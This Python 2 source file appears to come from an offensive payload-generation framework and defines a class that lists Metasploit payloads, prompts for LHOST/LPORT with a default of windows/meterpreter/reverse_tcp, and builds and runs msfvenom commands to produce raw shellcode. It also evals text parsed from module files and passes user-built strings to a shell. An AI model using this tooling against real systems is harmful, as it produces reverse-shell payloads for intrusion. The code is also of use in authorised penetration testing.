"""
Contains main Shellcode class as well as the Completer class used
for tab completion of metasploit payload selection.

"""

# Import Modules
import commands
import socket
import sys
import os
import sys
import re
import readline

from modules.common import messages
from modules.common import helpers
from modules.common import completers
from config import veil

class Shellcode:
	"""
	Class that represents a shellcode object, custom of msfvenom generated.

	"""
	def __init__(self):
		# the nested dictionary passed to the completer
		self.payloadTree = {}
		# the entier msfvenom command that may be built
		self.msfvenomCommand = ""
		# any associated msfvenom options
		self.msfvenomOptions = list()
		# in case user specifies a custom shellcode string
		self.customshellcode = ""
		# specific msfvenom payload specified
		self.msfvenompayload= ""
		# misc options
		self.options = list()

		# load up all the metasploit modules available
		self.LoadModules()

	def LoadModules(self):
		"""
		Crawls the metasploit install tree and extracts available payloads
		and their associated required options for langauges specified.

		"""

		# Variable changed for compatibility with  non-root and non-Kali users
		# Thanks to Tim Medin for the patch 
		msfFolder = veil.METASPLOIT_PATH

		# I can haz multiple platforms?
		platforms = ["windows"]

		for platform in platforms:
			self.payloadTree[platform] = {}

			stagesX86 = list()
			stagersX86 = list()
			stagesX64 = list()
			stagersX64 = list()

			# load up all the stages (meterpreter/vnc/etc.)
			# TODO: detect Windows and modify the paths appropriately
			for root, dirs, files in os.walk(veil.METASPLOIT_PATH + "/modules/payloads/stages/" + platform + "/"):
				for f in files:
					stageName = f.split(".")[0]
					if "x64" in root:
						stagesX64.append(f.split(".")[0])
						if "x64" not in self.payloadTree[platform]:
							self.payloadTree[platform]["x64"] = {}
						self.payloadTree[platform]["x64"][stageName] = {}
					elif "x86" in root: # linux payload structure format
						stagesX86.append(f.split(".")[0])
						if "x86" not in self.payloadTree[platform]:
							self.payloadTree[platform]["x86"] = {}
						self.payloadTree[platform]["x86"][stageName] = {}
					else: # windows payload structure format
						stagesX86.append(f.split(".")[0])
						if stageName not in self.payloadTree[platform]:
							self.payloadTree[platform][stageName] = {}

			# load up all the stagers (reverse_tcp, bind_tcp, etc.)
			# TODO: detect Windows and modify the paths appropriately
			for root, dirs, files in os.walk(veil.METASPLOIT_PATH + "/modules/payloads/stagers/" + platform + "/"):
				for f in files:

					if ".rb" in f:
						extraOptions = list()
						moduleName = f.split(".")[0]
						lines = open(root + "/" + f).readlines()
						for line in lines:
							if "OptString" in line.strip() and "true" in line.strip():
								cmd, options = eval(")".join(line.strip().replace("true", "True").split("OptString.new(")[1].split(")")[:-1]))
								extraOptions.append(cmd)
						if "bind" in f:
							if "x64" in root:
								for stage in stagesX64:
									self.payloadTree[platform]["x64"][stage][moduleName] = ["LHOST"] + extraOptions
							elif "x86" in root:
								for stage in stagesX86:
									self.payloadTree[platform]["x86"][stage][moduleName] = ["LHOST"] + extraOptions
							else:
								for stage in stagesX86:
									self.payloadTree[platform][stage][moduleName] = ["LHOST"] + extraOptions
						if "reverse" in f:
							if "x64" in root:
								for stage in stagesX64:
									self.payloadTree[platform]["x64"][stage][moduleName] = ["LHOST", "LPORT"] + extraOptions
							elif "x86" in root:
								for stage in stagesX86:
									self.payloadTree[platform]["x86"][stage][moduleName] = ["LHOST", "LPORT"] + extraOptions
							else:
								for stage in stagesX86:
									self.payloadTree[platform][stage][moduleName] = ["LHOST", "LPORT"] + extraOptions

			# load up any payload singles
			# TODO: detect Windows and modify the paths appropriately
			for root, dirs, files in os.walk(veil.METASPLOIT_PATH + "/modules/payloads/singles/" + platform + "/"):
				for f in files:

					if ".rb" in f:

						lines = open(root + "/" + f).readlines()
						totalOptions = list()
						moduleName = f.split(".")[0]

						for line in lines:
							if "OptString" in line.strip() and "true" in line.strip():
								cmd, options = eval(")".join(line.strip().replace("true", "True").split("OptString.new(")[1].split(")")[:-1]))
								if len(options) == 2:
									# only append if there isn't a default already filled in
									totalOptions.append(cmd)
						if "bind" in f:
							totalOptions.append("LHOST")
						if "reverse" in f:
							totalOptions.append("LHOST")
							totalOptions.append("LPORT")
						if "x64" in root:
							self.payloadTree[platform]["x64"][moduleName] = totalOptions
						elif "x86" in root:
							self.payloadTree[platform]["x86"][moduleName] = totalOptions
						else:
							self.payloadTree[platform][moduleName] = totalOptions

	def SetPayload(self, payloadAndOptions):
		"""
		Manually set the payload/options, used in scripting

		payloadAndOptions = nested 2 element list of [msfvenom_payload, ["option=value",...]]
				i.e. ["windows/meterpreter/reverse_tcp", ["LHOST=192.168.1.1","LPORT=443"]]
		"""

		# extract the msfvenom payload and options
		payload = payloadAndOptions[0]
		options = payloadAndOptions[1]

		# build the msfvenom command
		# TODO: detect Windows and modify the msfvenom command appropriately
		self.msfvenomCommand = "msfvenom -p " + payload

		# add options only if we have some
		if options:
			for option in options:
				self.msfvenomCommand += " " + option + " "
		self.msfvenomCommand += " -b \'\\x00\\x0a\\xff\' -f c | tr -d \'\"\' | tr -d \'\n\'"

		# set the internal msfvenompayload to this payload
		self.msfvenompayload = payload

		# set the internal msfvenomOptions to these options
		if options:
			for option in options:
				self.msfvenomOptions.append(option)

	def setCustomShellcode(self, customShellcode):
		"""
		Manually set self.customshellcode to the shellcode string passed.

		customShellcode = shellcode string ("\x00\x01...")
		"""
		self.customshellcode = customShellcode


	def custShellcodeMenu(self, showTitle=True):
		"""
		Menu to prompt the user for a custom shellcode string.

		Returns None if nothing is specified.
		"""

		# print out the main title to reset the interface
		if showTitle:
			messages.title()

		print ' [?] Use msfvenom or supply custom shellcode?\n'
		print '		1 - msfvenom (default)'
		print '		2 - Custom\n'

		choice = raw_input(" [>] Please enter the number of your choice: ")

		# Continue to msfvenom parameters.
		if choice == '2':
			CustomShell = raw_input(" [>] Please enter custom shellcode (one line, no quotes, \\x00.. format): ")
			return CustomShell
		elif choice != '1':
			print helpers.color(" [!] WARNING: Invalid option chosen, defaulting to msfvenom!", warning=True)
			return None
		else:
			return None


	def menu(self):
		"""
		Main interactive menu for shellcode selection.

		Utilizes Completer() to do tab completion on loaded metasploit payloads.
		"""

		payloadSelected = None
		options = None

		# if no generation method has been selected yet
		if self.msfvenomCommand == "" and self.customshellcode == "":
			# prompt for custom shellcode
			customShellcode = self.custShellcodeMenu()

			# if custom shellcode is specified, set it
			if customShellcode:
				self.customshellcode = customShellcode

			# else, if no custom shellcode is specified, prompt for metasploit
			else:

				# instantiate our completer object for tab completion of available payloads
				comp = completers.MSFCompleter(self.payloadTree)

				# we want to treat '/' as part of a word, so override the delimiters
				readline.set_completer_delims(' \t\n;')
				readline.parse_and_bind("tab: complete")
				readline.set_completer(comp.complete)

				# have the user select the payload
				while payloadSelected == None:

					print '\n [*] Press [enter] for windows/meterpreter/reverse_tcp'
					print ' [*] Press [tab] to list available payloads'
					payloadSelected = raw_input(' [>] Please enter metasploit payload: ').strip()
					if payloadSelected == "":
						# default to reverse_tcp for the payload
						payloadSelected = "windows/meterpreter/reverse_tcp"
					try:
						parts = payloadSelected.split("/")
						# walk down the selected parts of the payload tree to get to the options at the bottom
						options = self.payloadTree
						for part in parts:
							options = options[part]

					except KeyError:
						# make sure user entered a valid payload
						print helpers.color(" [!] ERROR: Invalid payload specified!\n", warning=True)
						payloadSelected = None

				# remove the tab completer
				readline.set_completer(None)

				# set the internal payload to the one selected
				self.msfvenompayload = payloadSelected

				# request a value for each required option
				for option in options:
					value = ""
					while value == "":

						### VALIDATION ###

						# LHOST is a special case, so we can tab complete the local IP
						if option == "LHOST":

							# set the completer to fill in the local IP
							readline.set_completer(completers.IPCompleter().complete)
							value = raw_input(' [>] Enter value for \'LHOST\', [tab] for local IP: ')

							hostParts = value.split(".")
							if len(hostParts) > 1:

								# if the last chunk is a number, assume it's an IP address
								if hostParts[-1].isdigit():

									# do a regex IP validation
									if not re.match(r"^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$",value):
										print helpers.color("\n [!] ERROR: Bad IP address specified.\n", warning=True)
										value = ""

								# otherwise assume we've been passed a domain name
								else:
									if not helpers.isValidHostname(value):
										print helpers.color("\n [!] ERROR: Bad hostname specified.\n", warning=True)
										value = ""

							# if we don't have at least one period in the hostname/IP
							else:
								print helpers.color("\n [!] ERROR: Bad IP address or hostname specified.\n", warning=True)
								value = ""

						# LPORT validation
						else:

							# set the completer to fill in the default MSF port (4444)
							readline.set_completer(completers.MSFPortCompleter().complete)
							value = raw_input(' [>] Enter value for \'' + option + '\': ')

							if option == "LPORT":
								try:
									if int(value) <= 0 or int(value) >= 65535:
										print helpers.color(" [!] ERROR: Bad port number specified.\n", warning=True)
										value = ""
								except ValueError:
									print helpers.color(" [!] ERROR: Bad port number specified.\n", warning=True)
									value = ""

					# append all the msfvenom options
					self.msfvenomOptions.append(option + "=" + value)

				# allow the user to input any extra OPTION=value pairs
				extraValues = list()
				while True:
					selection = raw_input(' [>] Enter extra msfvenom options in OPTION=value syntax: ')
					if selection != "":
						extraValues.append(selection)
					else: break

				# build out the msfvenom command
				# TODO: detect Windows and modify the paths appropriately
				self.msfvenomCommand = "msfvenom -p " + payloadSelected
				for option in self.msfvenomOptions:
					self.msfvenomCommand += " " + option
					self.options.append(option)
				if len(extraValues) != 0 :
					self.msfvenomCommand += " " +  " ".join(extraValues)
				self.msfvenomCommand += " -b \'\\x00\\x0a\\xff\' -f c | tr -d \'\"\' | tr -d \'\n\'"


	def generate(self):
		"""
		Based on the options set by menu(), setCustomShellcode() or SetPayload()
		either returns the custom shellcode string or calls msfvenom
		and returns the result.

		Returns the shellcode string for this object.
		"""

		# if the msfvenom command nor shellcode are set, revert to the
		# interactive menu to set any options
		if self.msfvenomCommand == "" and self.customshellcode == "":
			self.menu()

		# return custom specified shellcode if it was set previously
		if self.customshellcode != "":
			return self.customshellcode

		# generate the shellcode using msfvenom
		else:
			print helpers.color("\n [*] Generating shellcode...")
			if self.msfvenomCommand == "":
				print helpers.color(" [!] ERROR: msfvenom command not specified in payload!\n", warning=True)
				return None
			else:
				# Stript out extra characters, new lines, etc., just leave the shellcode.
				# Tim Medin's patch for non-root non-kali users
				FuncShellcode = commands.getoutput(veil.METASPLOIT_PATH + self.msfvenomCommand)
				FuncShellcode = FuncShellcode[82:-1]
				FuncShellcode = FuncShellcode.strip()
				return FuncShellcode
